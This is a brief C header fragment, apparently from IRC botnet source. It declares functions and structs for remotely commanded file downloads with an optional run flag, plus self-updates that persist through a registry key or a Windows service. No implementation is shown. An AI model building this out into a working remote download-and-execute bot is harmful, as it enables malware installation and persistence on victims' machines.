

#ifndef NO_DOWNLOAD
DWORD WINAPI download_file(LPVOID param);
DWORD WINAPI update_file(LPVOID param);
HRESULT xURLDownloadToFile(char *szURL, char *szFileName);

typedef struct download 
{
	char szUrl[256];
	char szDestination[MAX_PATH];
	bool bRun;
	SOCKET bsock;
	char szAction[32];
	char szChannel[32];
} download;

typedef struct update
{
	char szUrl[256];
	char szFileName[32];
	char szRegKeyName[32];
	char szServiceName[32];
	bool bUseRegistry;
	bool bUseService;
	SOCKET bsock;
	WSAEVENT event;
	char szAction[32];
	char szChannel[32];
} update;
#endif